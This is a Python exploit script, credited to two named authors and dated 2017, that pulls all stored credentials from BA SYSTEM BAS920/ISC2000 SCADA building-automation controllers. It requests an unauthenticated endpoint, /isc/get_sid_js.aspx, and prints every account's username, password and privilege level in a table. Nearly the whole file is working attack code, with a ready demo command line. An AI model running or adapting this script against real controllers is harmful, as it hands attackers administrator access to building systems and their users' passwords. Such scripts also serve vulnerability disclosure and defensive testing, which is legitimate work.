# -*- coding: utf-8 -*- 
import sys
import json
import requests
import argparse
from BeautifulSoup import BeautifulSoup

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

details = ''' 
 # Exploit Title: 	SCADAS "BAS920 & ISC2000"; Credentials Exposed
 # Date: 		22/12/2017
 # Exploit Author: 	Fernandez Ezequiel ( @capitan_alfa )  && Bertin Jose ( @bertinjoseb )
 # Vendor: 		BA SYSTEM
 # Category: 		Building automation

'''
# https://en.wikipedia.org/wiki/Building_automation

parser = argparse.ArgumentParser(prog='plinplanplum.py',
								description=' [+] Obtaining all credentials for the Supervisor/Administrator account', 
								epilog='[+] Demo: python plinplanplum.py --host 192.168.1.101 -p 81',
								version="1.0.1")

parser.add_argument('--host', 	dest="HOST",  	help='Host',	required=True)
parser.add_argument('--port', 	dest="PORT",  	help='Port',	default=80)
#parser.add_argument('--mode', 	dest="MODE",  	help='Port', 	choices=['1','2'],	default=1)


args	= 	parser.parse_args()

HST   	= 	args.HOST
port 	= 	args.PORT
#atkTp 	= |	int(args.MODE)

headers = {}

fullHost_1 	= 	"http://"+HST+":"+str(port)+"/isc/get_sid_js.aspx"
fullHost_2	= 	"http://"+HST+":"+str(port)+"/isc/get_sid.aspx"

host 		= 	"http://"+HST+":"+str(port)+"/"

def getUsr(USRs):
	usrList = []
	cont = 0

	for objs in range(0,len(USRs)):
		usuario = USRs[objs]["name"]
		if len(usuario) > 0:
			usrList.append(usuario)
	return usrList

def makeReqHeaders():
	headers["Host"] 			=  host
	headers["User-Agent"]		= "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Connection"] 		= "close"
	headers["Content-Type"] 	= "text/html"
	
	return headers

def getVersion():
	infoList = []
	r1 = requests.get(host+"/html/info.htm", headers=makeReqHeaders())
	#return r1.text
	parsed_html = BeautifulSoup(r1.text)
	table = parsed_html.find("table")
	print "\n"
	for row in table.findAll("tr"):
		
		cells = row.findAll("td")
		if len(cells) > 1:
			dsc  = cells[0].find(text=True).replace("&nbsp;"," ")
			valx = cells[1].find(text=True).replace("&nbsp;"," ")
			infoList.append(" [+]"+dsc + ": \t"+str(valx))

	return infoList


def getKeys():
	#if atkTp == 1:
	r1 = requests.get(fullHost_1, headers=makeReqHeaders())
	#else:
	#	r1 = requests.get(fullHost_2, headers=makeReqHeaders())

	headerSrv =  r1.headers["Server"]
	return r1.text,headerSrv
rawReq = []

try:
	print details
	rawReq = getKeys() # ----> Menuinit()
except Exception as e:
	#print e
	print "[!] Connection aborted"
	sys.exit(0)

try:
	rawCreds = json.loads(rawReq[0])
except Exception as e:
	print "\n"
	print e
	print Colors.GREEN+"  [+] "+Colors.BLUE+HST 
	print Colors.GREEN+"  [+] "+Colors.BLUE+rawReq[1] 	
	print Colors.GREEN+"  [!] "+Colors.RED+"No vuln !!!"+Colors.DEFAULT
	print "\n"
	sys.exit(0)

allUsers = rawCreds.values()[0]
totUsr 	 = len(getUsr(allUsers))

usersUp  = getUsr(allUsers)
serverX = rawReq[1]

print Colors.GREEN+"\n [+]"+Colors.BLUE+" GET:     "+Colors.RED+fullHost_1+Colors.DEFAULT
print Colors.GREEN+" [+]"+Colors.BLUE+" Server:  "+Colors.RED+str(serverX)+Colors.DEFAULT

''';
## Obtener version del device !
try:
	descInfo = getVersion()
	print " [+] Firmware:\t"+str(descInfo[0].split(':')[1])
	print " [+] Script: \t"+str(descInfo[1].split(':')[1])
	# print descInfo[0]
	# print descInfo[1]
except Exception as e:
#	print e
	pass
#for desc in descInfo:
#	print desc
'''	

table = '''
 +-----+------------------------+------------------+---------------+---------------------------+
 | Sid | Username 	        | Password 		| Email 		| SMS 						|
 +-----+------------------------+------------------+---------------+---------------------------+'''

print table

for usersUp in range(0,totUsr):
	sidlevel 	= allUsers[usersUp]["sidlevel"]
	usuario 	= allUsers[usersUp]["name"]
	password 	= allUsers[usersUp]["pass"]

	#email 		= allUsers[usersUp]["email"]
	#sms 		= allUsers[usersUp]["sms"]

	print Colors.ORANGE+" |   "+str(sidlevel)+" | "+usuario+"\t\t\t"+"| "+password

print " +-----+------------------------+------------------+---------------+---------------------------+\n"
